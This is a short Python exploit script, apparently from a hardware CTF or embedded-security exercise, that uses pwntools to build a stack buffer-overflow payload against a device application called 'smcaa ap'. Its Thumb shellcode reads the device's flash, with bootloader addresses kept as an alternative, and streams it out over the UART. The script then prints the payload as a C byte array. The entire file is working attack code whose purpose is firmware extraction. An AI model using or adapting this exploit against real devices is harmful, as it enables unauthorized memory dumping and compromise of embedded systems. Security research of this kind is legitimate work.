from pwn import *

# generates the payload to exploit the smcaa ap buffer overflow and dump its flash

# return address to shellcode (plus 1 for thumb)
return_address = 0x2001ffc8 + 1

# address we will read from
start_dump_addr = 0x1000e000
# amount of bytes we will print out
dump_length = 0x00038000

# dump addressess for the bootloader
# start_dump_addr = 0x10000000
# dump_length = 0x0000e000

# status register for uart
uart_status = 0x40042000 + 0x4
# fifo register for uart
uart_fifo_tx = 0x40042000 + 0x20

reg_write = f'''
    nop
    ldr r0, ={hex(start_dump_addr)}
    ldr r1, ={hex(uart_fifo_tx)}
    ldr r2, ={hex(uart_status)}
    mov r3, #1
    ldr r4, ={hex(dump_length)}
    loop:
    busy_loop:
    ldrb r6, [r2]
    and r6, r6, #0x40
    cmp r6, #0
    beq busy_loop

    ldrb r6, [r0]
    add r0, r0, #1
    strb r6, [r1]
    add r3, r3, #1
    cmp r3, r4
    ble loop
    end:
    nop
'''

shellcode = asm(reg_write, arch="thumb")

# in send validate, offset from recive buffer to return address is 0x28
payload = b'a' * 0x28 + p32(return_address) + shellcode

print(len(payload))

# print out the payload in a way that can be copied easily to c code
print('{' + ','.join(str(byte) for byte in payload) + '}')
